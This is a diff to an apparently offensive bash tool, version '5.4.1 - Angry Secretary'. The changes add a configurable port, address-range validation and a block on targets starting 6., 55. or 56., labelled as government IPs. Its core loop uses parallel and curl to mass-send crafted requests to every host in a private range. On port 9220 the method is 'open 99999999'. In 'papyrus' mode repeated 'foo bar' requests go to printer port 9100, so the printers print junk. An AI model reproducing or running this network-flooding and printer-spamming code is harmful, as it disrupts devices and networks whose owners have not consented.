@@ -59,6 +59,17 @@ OPTION:			    DESCRIPTION:
 			    such as ones found in
 			    /etc/security/limits.conf
 
+-P, --port={PORT} 	    Specify a specific 
+			    port. Useful for 
+			    port-forwarded
+			    hosts. Port number 
+			    is set automatically 
+			    based on the attack
+			    being preformed.
+			    PORT can be any
+			    number ranging
+			    from 1 to 65535. 
+
 --no-check		    Will skip dependency
 			    checking.
 
@@ -80,24 +91,25 @@ EOF
 exit $1
 }
 
-options=$(getopt -o t:n:i:j:p:s:qvh -l target:,network:,papyrus:,interval:,jobs:,proc:,slots:,no-check,quiet,version,help -n "$0" -- "$@") || help '1'
+options=$(getopt -o t:n:i:j:p:s:P:qvh -l target:,network:,papyrus:,interval:,jobs:,proc:,slots:,port:,no-check,quiet,version,help -n "$0" -- "$@") || help '1'
 eval set -- "$options"
 
 while [[ $1 != -- ]]
 do
 	case $1 in
-	-t|--target)     target=$2 ; shift 2 				  		  ;;
-	-n|--network)    networkRoute=$2 ; shift 2					  ;;
-	--papyrus)	 printRequests=$2 ; shift 2					  ;;
-	-i|--interval)   interval=$2 ; shift 2						  ;;
-	-j|--jobs)	 jobs=$2 ; shift 2				  		  ;;
+	-t|--target)     target=$2 ; shift 2 				  	  ;;
+	-n|--network)    networkRoute=$2 ; shift 2				  ;;
+	--papyrus)	 printRequests=$2 ; shift 2				  ;;
+	-i|--interval)   interval=$2 ; shift 2					  ;;
+	-j|--jobs)	 jobs=$2 ; shift 2				  	  ;;
 	-p|--proc)	 processes=$2 ; shift 2 				          ;;
-	-s|--slots)	 slots=$2 ; shift 2				  		  ;;
+	-s|--slots)	 slots=$2 ; shift 2				  	  ;;
+	-P|--port)	 port=$2 ; shift 2					  ;;
 	--no-check)      dependencyCheck='False' ; shift 1                                ;;
-	-q|--quiet)	 quietOutput='/dev/null' ; shift 1			 	  ;;
+	-q|--quiet)	 quietOutput='/dev/null' ; shift 1			   ;;
 	-v|--version)    printf 'Version: 5.4.1 - Angry Secretary\n' ; exit 0 ; shift 1   ;;
-	-h|--help)       help '0' ; shift 1 				  		  ;;
-	*)               printf 'Invalid Option\n' ; help '1' 		  		  ;;
+	-h|--help)       help '0' ; shift 1 				  	  ;;
+	*)               printf 'Invalid Option\n' ; help '1' 		  	  ;;
 	esac
 done
 
@@ -117,11 +129,21 @@ if [ -z $interval ]
 then
 	interval='1'
 fi
-if [ ! -z $printRequests ]
+
+if [ -z $port ]
 then
-	port='9100'
+	if [ ! -z $printRequests ] 
+	then
+		port='9100'
+	else
+		port='9220'
+	fi
 else
-	port='9220'
+	if [ $port -gt 65535 ] || [ $port -lt 1 ]
+	then
+		printf "[%bFAIL%b] Invalid port range\n" $RED $NC
+		exit 1
+	fi
 fi
 
 function output(){
@@ -154,6 +176,14 @@ function attackSpecifiedTarget(){
 		printf "[%bFAIL%b] Not a valid IP address. Exiting\n" $RED $NC
 		exit 1
 	fi
+	####
+	#block scanning of restricted IPs
+	if [[ $(grep -q -Eo "^6\.|^55\.|^56\." <<< $target && printf '0') == '0' ]]
+	then
+        	printf "[%bBLOCKED%b] Denied potential exploiting of\n          restricted government IPs. Exiting\n" $RED $NC
+        	exit 1
+	fi
+	####
 	if [ ! -z $target ] && [[ $(nc -w 1 -z $target $port && printf '0') == '0' ]]
 	then
 		if [ ! -z $printRequests ]
@@ -213,6 +243,12 @@ function NETWORKING(){
 	if [[ ${NETWORKADDR[0]} == 10 ]]
 	then
 		:
+	elif [[ ${NETWORKADDR[0]} == 127 ]]
+	then
+		:
+	elif [[ ${NETWORKADDR[0]} == 169 ]] && [[ ${NETWORKADDR[1]} == 254 ]]
+        then
+		:
 	elif [[ ${NETWORKADDR[0]} == 172 ]] && [[ $(grep -Ex "^1[6-9]|^2[0-9]|^3[0-1]" <<< ${NETWORKADDR[1]} || printf '1') != '1' ]]
 	then
 		:
@@ -223,6 +259,22 @@ function NETWORKING(){
 		printf "[%bFAIL%b] Not a private address. Exiting\n" $RED $NC
 		exit 1
 	fi
+
+	if [[ ${NETWORKADDR[0]} == 10 ]] || [[ ${NETWORKADDR[0]} == 127 ]]
+	then
+		loop=`seq 1 3`
+	else
+		loop=`seq 2 3`
+	fi
+
+	for i in $loop
+	do
+		if [[ ${NETWORKADDR[$i]} -gt 255 ]]
+		then
+			printf "[%bFAIL%b] Address not in-scope of a valid IPv4 address. Exiting\n" $RED $NC
+                	exit 1
+		fi
+	done
 	####
 
         printf "[%bINFO%b] Need to scan: %s hosts\n" $YELLOW $NC $HOSTS
@@ -248,6 +300,17 @@ function NETWORKING(){
 		then
 			break
 		fi
+
+		if [ ${NETWORKADDR[0]} == 127 ] && [ ${NETWORKADDR[1]} == 255 ] && [ ${NETWORKADDR[2]} == 255 ] && [ ${NETWORKADDR[3]} == 255 ]
+                then
+                        break
+                fi
+
+		if [ ${NETWORKADDR[0]} == 169 ] && [ ${NETWORKADDR[1]} == 254 ] && [ ${NETWORKADDR[2]} == 255 ] && [ ${NETWORKADDR[3]} == 255 ]
+                then
+                        break
+                fi
+
 		if [ ${NETWORKADDR[0]} == 172 ] && [ ${NETWORKADDR[1]} == 31 ] && [ ${NETWORKADDR[2]} == 255 ] && [ ${NETWORKADDR[3]} == 255 ]
 		then
 			break
@@ -301,9 +364,9 @@ done
 trap "cleanup break" SIGHUP SIGINT SIGQUIT
 if [ -z $printRequests ]
 then
-	parallel --bar -k --jobs $jobs --max-procs $processes -P $slots curl -A 'null' {}:9220 --silent -m $interval --output /dev/null -X 'open\ 99999999' :::: tmp/addressRanges.txt
+	parallel --bar -k --jobs $jobs --max-procs $processes -P $slots curl -A 'null' {}:$port --silent -m $interval --output /dev/null -X 'open\ 99999999' :::: tmp/addressRanges.txt
 else
-	parallel --bar -k --jobs $jobs --max-procs $processes -P $slots curl -A 'null' {1}:9100 --silent -m $interval --output /dev/null -X 'foo\ bar' :::: tmp/addressRanges.txt :::: <(seq $printRequests)
+	parallel --bar -k --jobs $jobs --max-procs $processes -P $slots curl -A 'null' {1}:$port --silent -m $interval --output /dev/null -X 'foo\ bar' :::: tmp/addressRanges.txt :::: <(seq $printRequests)
 fi
 cleanup 'end'
 }
